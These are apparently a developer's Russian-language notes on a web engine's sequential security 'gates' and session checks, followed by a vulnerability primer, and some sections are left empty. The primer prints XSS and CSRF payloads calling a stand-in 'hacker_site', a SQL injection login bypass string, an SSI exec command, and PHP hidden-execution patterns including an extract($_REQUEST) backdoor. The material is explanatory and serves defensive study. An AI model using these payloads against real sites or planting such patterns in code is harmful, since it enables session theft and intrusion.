# Уровни защиты

В системе применяется несколько уровней защиты. Они следуют друг за другом. После прохождения каждого уровня система загружает следующие компоненты и переходит к следующему уровню проверки.

Такая реализация получила внутреннее название гейты безопасности, а каждый уровень защиты называется гейт.

Последовательность гейтов неизменна, т.к. она зависит от последовательности загрузки компонентов системы. Но через настройки можно выключить тот или иной гейт, тогда проверки безопасности не будет, а система загрузит очередные компоненты сразу.

1й гейт отвечает за проверку системы - это определение необходимых функций, констант, а также версии системы. Все это определяется ДО прохождения первого гейта.

2й гейт отвечает за определение источника запроса к системе - внешний или внутренний, разрешенный или нет. Гейт отбрасывает только запрещенные внешние запросы, остальные пропускает.

3й гейт - блокировка по ip. Проверка осуществляется по черному или белому списку адресов. Поддерживаются как ip4, так и ip6, одиночные адреса и диапазоны через тире, звездочку и в формате CIDR. Для работы этого гейта подгружаются фунции обработки ip адресов.

4й гейт - проверка на вызов ошибки. Если сайт был загружен с данными об ошибке, то система ведет ее обработку, а затем перенаправляет на шаблон. Никакие другие функции и данные не загружаются.

5й гейт встроен в обработчик путей. Если путь не соответствует определенным требованиям (это как системные условия, так и пользовательские настройки), то система перезагружается с обработанным правильным путем, либо вызывает ошибку. В ряде случаев она перенаправляет на доп.обработчик, но это касается служебного динамического контента.

6й гейт устанавливает и проверяет куки и сессию.

Между 6м и 7м гейтами идет загрузка множества компонентов, но все они необходимы, т.к. далее следует работа с базой данных.

7й гейт осуществляет проверку пользователя по базе данных с назначением ему прав.

После 7го гейта идет загрузка оставшихся компонентов системы. Также, если пользователь получил определенные права, активируется разрешение на запись в базу данных. Пока этот момент не реализован, но скорее всего он будет осуществлен через константу.

8й гейт осуществляет проверку запросов и перенаправление на процессор.

После этого инициализация системы считается завершенной и система переходит непосредственно к загрузке сайта.

# Принципы работы гейтов

6й гейт.

Когда пользователь заполняет форму авторизации/регистрации, его браузер отправляет серверу запрос.

Сервер принимает этот запрос и начинает проходить гейты. Данный гейт его пропускает, потому что на тот момент пользователю еще не назначены идентификационные куки.

В результате сервер пропускает пользователя до процессора, который приступает к обработке запроса авторизации/регистрации.

Если запрос завершился успешно, стартуется сессия, пользователь получает куки и сервер перезапускает систему.

Здесь есть еще один важный момент. При авторизации/регистрации пользователя сессии назначается специальный триггер 'allow', который условно показывает, что сессия была начата.

При новом запуске уже никакого запроса нет, но есть идентификационные куки. Данный гейт останавливает пользователя и начинает проверку кук, идентификатора сессии и триггера.

Если либо идентификатора, либо кук нет, или они поддельные, система выдает ошибку. Здесь также проверяется источник запроса, т.к. этот запрос должен поступать только от системы.

Если время сессии вышло, то все идентификаторы обновляются. Однако при этом проверяется триггер 'allow', и если он не установлен, то сессия закрывается, все ее данные и куки удаляются, а система выдает ошибку. Дело в том, что триггер 'allow' записывается не в куки, а в сессию и его практически невозможно подделать.

Однако теоретически остается возможность перехватить сессию - если будут похищены куки и выполнение запроса будет происходить с того же ip-адреса и с того же браузера. Однако при этом похитителю сложно будет выполнять запросы, т.к. их источник тоже нужно будет подделать.

Если же кто-то попытается похитить сессию и допустит ошибку, сессия будет сброшена, атакуемого выкинет из аккаунта, а необходимая служебная информация запишется в логи.

# Права пользователей



# Уровни защиты

Высокая безопасность подразумевает множественные проверки, что снижает скорость загрузки сайта и повышает нагрузку на сервер.

Тем более, что проверяться будет каждое обращение, каждый запрос, загрузка каждой страницы.

Поэтому в системе установлено несколько уровней защиты.

# Обычный уровень защиты

Здесь считается, что 

# Параноидальный уровень защиты

# Уровень защиты от DDOS-атак и при DDOS-атаках

# Блокировка по ip

Специальная секция блокировки ip в конфигурационных файлах сервера

Файл blacklist или blockip со списком заблокированных адресов в папке admin - их обрабатывает система, что в ряде случаев является лучшим вариантом, т.к. сервер почему-то не всегда справляется с блокировкой, особенно если идет блокировка по диапазону

# Сервисы для проверки:

Sucuri SiteCheck https://sitecheck.sucuri.net/
Google Safe Browsing https://transparencyreport.google.com/safe-browsing/search
Quttera http://quttera.com/
Web Inspector https://www.webinspector.com/
urlquery URL Scanner https://urlquery.net/
Norton Safe Web https://safeweb.norton.com/
VirusTotal https://www.virustotal.com/

Malware Domain List
PhishTank
Comodo

XSS (Cross-Site Scripting) - это вид уязвимости программного обеспечения (Web приложений), при которой, на генерированной сервером странице, выполняются вредоносные скрипты, с целью атаки клиента.
XSRF / CSRF (Request Forgery) - это вид уязвимости, позволяющий использовать недостатки HTTP протокола, при этом злоумышленники работают по следующей схеме: ссылка на вредоносный сайт установливается на странице, пользующейся доверием у пользователя, при переходе по вредоносной ссылке выполняется скрипт, сохраняющий личные данные пользователя (пароли, платежные данные и т.д.), либо отправляющий СПАМ сообщения от лица пользователя, либо изменяет доступ к учетной записи пользователя, для получения полного контроля над ней.
Code injections (SQL, PHP, ASP и т.д.) - это вид уязвимости, при котором становится возможно осуществить запуск исполняемого кода с целью получения доступа к системным ресурсам, несанкционированного доступа к данным либо выведения системы из строя.
Server-Side Includes (SSI) Injection - это вид уязвимости, использующий вставку серверных команд в HTML код или запуск их напрямую с сервера.
Authorization Bypass - это вид уязвимости, при котором возможно получить несанкционированный доступ к учетной записи или документам другого пользователя

# XSS

<script>alert(document.cookie);</script>
<script>window.parent.location.href='http://hacker_site';</script>
<object type="text/x-scriptlet" data="http://hacker_site"></object>

# XSRF / CSRF (Request Forgery)

Наиболее частыми CSRF атаками являются атаки использующие HTML <IMG> тэг или Javascript объект image. Чаще всего атакующий добавляет необходимый код в электронное письмо или выкладывает на веб-сайт, таким образом, что при загрузке страницы осуществляется запрос, выполняющий вредоносный код. Примеры:

IMG SRC
<img src="http://hacker_site/?command">

SCRIPT SRC
<script src="http://hacker_site/?command">

Javascript объект Image
<script>
           var foo = new Image();
           foo.src = "http://hacker_site/?command";
</script>

# Code injections (SQL, PHP, ASP и т.д.)

Вставки исполняемого кода рассмотрим на примере кода SQL. Форма входа в систему имеет 2 поля - имя и пароль. Обработка происходит в базе данных через выполнение SQL запроса:

SELECT Username
FROM Users
WHERE Name = 'tester'
AND Password = 'testpass';

Вводим корректное имя ’tester’, а в поле пароль вводим строку:

testpass' OR '1'='1

В итоге, Если поле не имеет соответствующих валидаций или обработчиков данных, может вскрыться уязвимость, позволяющая зайти в защищенную паролем систему, т.к.SQL запрос примет следующий вид:

SELECT Username
FROM Users
WHERE Name = 'tester'
AND Password = 'testpass' OR '1'='1';

Условие '1'='1' всегда будет истинным и поэтому SQL запрос всегда будет возвращать много значений.

# Server-Side Includes (SSI) Injection

В зависимости от типа операционной системы команды могут быть разными, как пример рассмотрим команду, которая выводит на экран список файлов в OS Linux:

< !--#exec cmd="ls" -->

# Authorization Bypass

Пользователь А может получить доступ к документам пользователя Б. Допустим, есть реализация, где при просмотре своего профиля, содержащего конфеденциальную информацию, в URL страницы передается userID, а данном случае есть смысл попробовать подставить вместо своего userID номер другого пользователя. И если вы увидите его данные, значит вы нашли дефект.

# Вариант 1: косвенный вызов функции

<?php 
    $a = "var_dump";
    $b = "Test";
    $a($b);
?>

# Вариант 2: выполнение кода через eval

<?php
  eval('$a = "Test"; echo $a;');
?>

# Вариант 3: выполнение кода через assert

<?php
  assert('print("Test")');
?>

# Вариант 4: выполнение кода через array_map

<?php
  function evil($a) {
    echo $a;
  }
  array_map('evil', array("Test"));
?>

# Вариант 5: выполнение кода через preg_replace('/.*/e')

<?php
  preg_replace('/.*/e', 'print("Test")', '');
?>

# Вариант 6: выполнение кода через preg_replace_callback

<?php
  $a = function () { echo "Test"; };
  preg_replace_callback('/.*/', $a, ''); 
?>

# Вариант 7: выполнение кода через usort, uasort, uksort

<?php
  $a = function ($x, $y) { echo "Test"; };
  $b = array(1 => '1', 2 => '2');
  usort( $b, $a);
?>

# Вариант 8: скрытое объявление функций и передача параметров через extract

<?php
   extract($_REQUEST);
   $a($b);
?>

